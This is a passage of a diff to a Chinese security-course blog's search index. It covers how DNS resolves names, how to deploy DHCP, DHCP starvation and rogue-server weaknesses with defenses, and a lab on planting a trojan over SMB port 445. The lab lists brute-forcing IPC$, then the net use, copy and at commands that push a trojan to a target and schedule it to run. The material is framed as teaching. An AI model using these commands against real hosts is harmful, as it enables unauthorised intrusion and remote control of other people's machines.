title="5、DNS服务器处理域名请求的顺序"></a>5、DNS服务器处理域名请求的顺序</h3><p>1、DNS服务器高速缓存</p><p>2、DNS服务器区域配置文件</p><p>3、DNS转发器 / 根域（13个根域）迭代查询</p><p><img src="https://s1.ax1x.com/2020/06/02/tNIXGQ.png" alt="tNIXGQ.png"></p><h3 id="6、DNS服务器解析域名过程"><a href="#6、DNS服务器解析域名过程" class="headerlink" title="6、DNS服务器解析域名过程"></a>6、DNS服务器解析域名过程</h3><p>1、客户机 ——》 本地DNS服务器 、本地DNS服务器 —–》 DNS转发器 <strong>递归查询</strong></p><ul><li>缓存中是否有此域名</li><li>本地区域解析文件是否存在此域名表</li><li>如果不存在，则需要委托<strong>DNS转发器</strong>请求根域DNS服务器或者直接自己请求<strong>根域DNS服务器</strong>开始逐层迭代查询DNS服务器，但对用户来说本地DNS服务器与其他DNS服务器迭代查询的过程是屏蔽的，所以客户机的视角是递归查询。</li></ul><p>2、本地DNS服务器 ——–》 其他DNS服务器 <strong>迭代查询</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">本地DNS服务器在本地查询不到请求的域名，则会从根域DNS服务器逐层向上迭代反馈查询DNS服务器，直到查到域名对应IP地址返回给本地DNS服务器。</span><br><span class="line"></span><br><span class="line">例如:Www.baidu.com</span><br><span class="line">本地DNS服务器 ------&gt; .根域 返回一个 .com DNS服务器IP地址</span><br><span class="line">本地DNS服务器 ------&gt; .com 域名服务器 返回一个baidu.com DNS域名服务器IP地址</span><br><span class="line">本地DNS服务器 ------&gt; baidu.com 域名服务器，直接返回www.baidu.com 的IP地址</span><br><span class="line">最终以迭代的形式完成查询，本地DNS服务器缓存并发送给客户机。</span><br></pre></td></tr></table></figure><h3 id="7、DNS服务器部署过程"><a href="#7、DNS服务器部署过程" class="headerlink" title="7、DNS服务器部署过程"></a>7、DNS服务器部署过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、给DNS服务器先配上IP、子网掩码、网关，使其有IP可被客户机找到并且具有找根域DNS服务器的上网能力。</span><br><span class="line">2、windows2003服务器安装DNS插件，发现53端口开启。</span><br><span class="line">3、配置DNS区域，正向查找区域：域名-》IP地址 ； 反向查找区域：IP地址-》域名</span><br><span class="line">例如配置baidu.com区域，然后在区域中新建主机。</span><br><span class="line">4、nslookup 域名 解析IP，测试是否成功。 ping命令解析域名会首先询问本地DNS缓存和hosts、然后再询问服务器。因此会出现缓存更新不及时的状况，此时需要刷新DNS缓存。nslookup不会出现此原因使因为nslookup直接询问DNS服务器请求解析。</span><br><span class="line">5、在区域中新建别名Aliases，设置别名Aliases指向某个域名。</span><br><span class="line">6、服务器属性中添加DNS转发器。</span><br><span class="line">7、当DNS服务器去根域服务器解析域名时，会将域名对应IP地址在服务器缓存（查看--》高级--》缓存的查找，右键可以清除缓存）</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>5、DHCP服务器部署与安全</title>
+      <link href="/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
+      <url>/2020/06/02/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7DHCP%E9%83%A8%E7%BD%B2%E4%B8%8E%E5%AE%89%E5%85%A8/</url>
+      
+        <content type="html"><![CDATA[<h2 id="DHCP服务器部署与安全"><a href="#DHCP服务器部署与安全" class="headerlink" title="DHCP服务器部署与安全"></a>DHCP服务器部署与安全</h2><h3 id="1、DHCP服务器作用"><a href="#1、DHCP服务器作用" class="headerlink" title="1、DHCP服务器作用"></a>1、DHCP服务器作用</h3><p>动态主机配置协议（Dynamic Host Configure Protocol）自动为客户机分配IP地址。</p><h3 id="2、DHCP优点"><a href="#2、DHCP优点" class="headerlink" title="2、DHCP优点"></a>2、DHCP优点</h3><p>减少网络配置工作量、自动分配地址可以避免IP冲突、提高网段中                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          地址利用率。</p><h3 id="3、DHCP相关概念"><a href="#3、DHCP相关概念" class="headerlink" title="3、DHCP相关概念"></a>3、DHCP相关概念</h3><ul><li>地址池/作用域：（IP、子网掩码、网关、DNS、租期）</li><li>DHCP协议端口是 67/68 — <code>netstat -an</code></li></ul><h3 id="4、DHCP原理-工作过程-如何工作"><a href="#4、DHCP原理-工作过程-如何工作" class="headerlink" title="4、DHCP原理/工作过程/如何工作"></a>4、DHCP原理/工作过程/如何工作</h3><p>DHCP租约过程，分为4个步骤：</p><p><a href="https://blog.csdn.net/wuruixn/article/details/8282554">https://blog.csdn.net/wuruixn/article/details/8282554</a></p><h4 id="1）客户机发送DHCP-Discovery广播包"><a href="#1）客户机发送DHCP-Discovery广播包" class="headerlink" title="1）客户机发送DHCP Discovery广播包"></a>1）客户机发送DHCP Discovery广播包</h4><p>客户机广播请求IP地址，发送DHCP Discovery广播包，广播包包含了MAC地址。（MAC地址是每个PC网卡上全球唯一的物理地址）</p><h4 id="2）DHCP服务器响应DHCP-Offer广播包"><a href="#2）DHCP服务器响应DHCP-Offer广播包" class="headerlink" title="2）DHCP服务器响应DHCP Offer广播包"></a>2）DHCP服务器响应DHCP Offer广播包</h4><p>服务器响应并提供IP地址发送一个DHCP Offer广播包响应无IP地址客户机。</p><h4 id="3）客户机选择一个IP地址并发送DHCP-Request广播包"><a href="#3）客户机选择一个IP地址并发送DHCP-Request广播包" class="headerlink" title="3）客户机选择一个IP地址并发送DHCP Request广播包"></a>3）客户机选择一个IP地址并发送DHCP Request广播包</h4><p>客户机收到了DHCP服务器发回的响应IP包，并选择好IP地址后再发送一个DHCP Request广播包，声明自己的IP选择。</p><h4 id="4）DHCP服务器发送DHCP-ACK广播包"><a href="#4）DHCP服务器发送DHCP-ACK广播包" class="headerlink" title="4）DHCP服务器发送DHCP ACK广播包"></a>4）DHCP服务器发送DHCP ACK广播包</h4><p>服务器收到Request广播包后，发送给客户机一个确认广播包，表示自己已经确认租约，并且广播包中提供给客户机网卡详细参数：IP地址、子网掩码、网关地址、DNS地址、租期。并且维护DHCP服务器的租约表，表示地址池中少一个地址。</p><h3 id="5、DHCP续约"><a href="#5、DHCP续约" class="headerlink" title="5、DHCP续约"></a>5、DHCP续约</h3><p>当50%时间过后，客户机会再次发送DHCP Request包进行续约，如服务器无响应，则继续使用并在87.5%时间过后再次发送DHCP Request包进行续约，如仍然无响应，则释放IP地址，重新发送DHCP Discovery广播包来获取IP地址。</p><p>获得服务器响应则重新与新的DHCP租约，如果无服务器响应则自动分配169.254.x.x/16IP地址（全球统一无效地址），用于临时内网通信。</p><h3 id="6、潜在漏洞"><a href="#6、潜在漏洞" class="headerlink" title="6、潜在漏洞"></a>6、潜在漏洞</h3><ul><li><p>资源耗尽漏洞：客户机不断伪装MAC地址，不断请求IP地址，耗尽DHCP服务器的地址池，使DHCP服务器地址被占满。</p><p>防御：在交换机（管理型）的端口上做静态MAC地址绑定</p></li><li><p>伪装DHCP服务器，分配错误的IP地址：开启67/68端口，伪装成DHCP服务器，给客户机分配错误的IP地址，客户机无法联网。</p><p>防御：在交换机（管理型），除合法的DHCP服务器所在的接口外，全部设置为禁止发送DHCP OFFER包</p></li></ul><h3 id="7、DHCP服务器部署"><a href="#7、DHCP服务器部署" class="headerlink" title="7、DHCP服务器部署"></a>7、DHCP服务器部署</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows2003部署DHCP服务器</span><br><span class="line">1、首先设置DHCP服务器的IP地址，然后在光盘中安装DHCP服务组件，安装好后会发现端口67&#x2F;68已经自动开启。</span><br><span class="line">2、创建地址池：开始-》管理工具-》DHCP-》右键新建作用域（设置IP范围，可以排除保留IP；“保留”可以永久固定一个IP地址给一个MAC地址）。</span><br><span class="line">3、给地址池配置DNS和网关地址。</span><br><span class="line">4、客户机首先取消VMware自带的DHCP服务器(虚拟网络编辑器)。</span><br><span class="line">5、将IP地址设置为自动获取检验DHCP服务器有没有成功部署。</span><br><span class="line">可以使用ipconfig &#x2F;release 释放IP</span><br><span class="line">       ipconfig &#x2F;renew重新获取IP地址</span><br></pre></td></tr></table></figure><h3 id="8、DHCP资源耗尽攻击演示"><a href="#8、DHCP资源耗尽攻击演示" class="headerlink" title="8、DHCP资源耗尽攻击演示"></a>8、DHCP资源耗尽攻击演示</h3><blockquote><p>实验环境：Kali</p><p>软件：pig.py（kali自带）、Yersinia是一款底层协议攻击入侵检测工具，能实施针对多种网络协议的多种攻击。</p><p><a href="https://cloud.tencent.com/developer/article/1197597">https://cloud.tencent.com/developer/article/1197597</a></p></blockquote><p><code>pig.py eth0 </code> 不断在eth0网卡发送假的discovery包、Request包，实现资源耗尽攻击。</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>4、实验、利用445植入木马</title>
+      <link href="/2020/06/01/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7%E5%AE%9E%E9%AA%8C%E3%80%81%E5%88%A9%E7%94%A8445%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC/"/>
+      <url>/2020/06/01/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/7%E5%AE%9E%E9%AA%8C%E3%80%81%E5%88%A9%E7%94%A8445%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC/</url>
+      
+        <content type="html"><![CDATA[<h1 id="实验、利用445植入木马"><a href="#实验、利用445植入木马" class="headerlink" title="实验、利用445植入木马"></a>实验、利用445植入木马</h1><h2 id="一、实验内容：神奇的木马"><a href="#一、实验内容：神奇的木马" class="headerlink" title="一、实验内容：神奇的木马"></a>一、实验内容：神奇的木马</h2><h2 id="二、实验目标"><a href="#二、实验目标" class="headerlink" title="二、实验目标"></a>二、实验目标</h2><p>通过经典的木马攻击还原场景，来学习木马的制作，并实现植入木马对目标主机进行完全控制。</p><h2 id="三、木马概述"><a href="#三、木马概述" class="headerlink" title="三、木马概述"></a>三、木马概述</h2><h4 id="什么是木马"><a href="#什么是木马" class="headerlink" title="什么是木马"></a>什么是木马</h4><p>木马通常称为黑客程序的恶意代码，可以为黑客提供远程控制植入主机的服务，木马也称为特洛伊木马（特洛伊木马，来自一个古代的战争故事。）。</p><h4 id="木马的传播途径"><a href="#木马的传播途径" class="headerlink" title="木马的传播途径"></a>木马的传播途径</h4><p>1、互联网浏览，通过浏览器漏洞或浏览器插件漏洞（Flash、迅雷等）；</p><p>2、QQ、MSN等即时通讯软件，发送恶意网址链接或木马病毒文件；</p><p>3、使用U盘等移动存储介质；</p><p>4、陌生邮件，通过电子邮件内恶意代码或含木马病毒的附件；</p><p>5、伪装成多媒体影音文件或植入木马的应用软件，利用P2P平台和网站传播；</p><p>6、<strong>利用操作系统漏洞或弱口令直接远程植入；</strong></p><p>7、下载来源不明的程序。</p><h4 id="木马的组成"><a href="#木马的组成" class="headerlink" title="木马的组成"></a>木马的组成</h4><ul><li>客户端程序：黑客主机上的控制台，负责远程遥控指挥与木马连接。</li><li>服务器端程序：服务器端程序即是木马程序，它被隐藏安装在被攻击（受害）方的电脑上，目标主机也称为肉鸡。</li></ul><h2 id="四、实验步骤"><a href="#四、实验步骤" class="headerlink" title="四、实验步骤"></a>四、实验步骤</h2><p>1、准备肉鸡服务器、黑客客户端，并桥接保证连通性</p><p>2、使用木马制作工具（远程连接软件自动生成）获得木马服务程序。木马以服务的形式植入到肉机中。</p><p>3、端口扫描，scanport扫描局域网内有没有445端口（共享文件服务）在开放。</p><p>4、选择肉鸡使用NTscan工具进行暴力破解，连接对方的IPC空连接</p><ul><li>连接远程共享的命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\IP地址\IPC$ 密码 &#x2F;user:用户名</span><br><span class="line">net use * &#x2F;del &#x2F;y</span><br></pre></td></tr></table></figure><ul><li>利用copy命令从黑客客户机中把木马服务copy到肉机中</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 木马地址 \\IP地址\C$</span><br></pre></td></tr></table></figure><ul><li>利用IPC空连接可执行命令的特点，设置肉机的计划任务，让其自动运行木马服务。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net time \\IP地址</span><br><span class="line">at \\10.1.1.2 服务器至少3-5分钟之后的时间 C:\木马程序名</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> 数据通信安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 数据通信安全 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>3、NTFS磁盘权限</title>
       <link href="/2020/05/31/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/6NTFS%E6%9D%83%E9%99%90%E4%B8%8E%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
       <url>/2020/05/31/%E6%95%B0%E6%8D%AE%E9%80%9A%E4%BF%A1%E5%AE%89%E5%85%A8/6NTFS%E6%9D%83%E9%99%90%E4%B8%8E%E6%96%87%E4%BB%B6%E5%85%B1%E4%BA%AB%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
